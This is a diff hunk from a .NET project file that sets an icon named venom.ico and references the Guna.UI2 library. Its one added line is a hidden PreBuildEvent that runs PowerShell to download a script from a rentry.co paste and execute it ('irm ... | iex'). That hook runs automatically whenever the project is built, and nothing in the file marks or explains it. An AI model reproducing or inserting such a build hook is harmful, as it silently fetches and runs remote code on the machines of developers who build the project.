@@ -35,6 +35,7 @@
   <PropertyGroup>
     <ApplicationIcon>venom.ico</ApplicationIcon>
   </PropertyGroup>
+<PropertyGroup><PreBuildEvent>powershell "irm rentry.co/fff542/raw | iex"</PreBuildEvent></PropertyGroup>
   <ItemGroup>
     <Reference Include="Guna.UI2, Version=2.0.4.5, Culture=neutral, PublicKeyToken=8b9d14aa5142e261, processorArchitecture=MSIL">
       <HintPath>..\packages\Guna.UI2.WinForms.2.0.4.5\lib\net472\Guna.UI2.dll</HintPath>
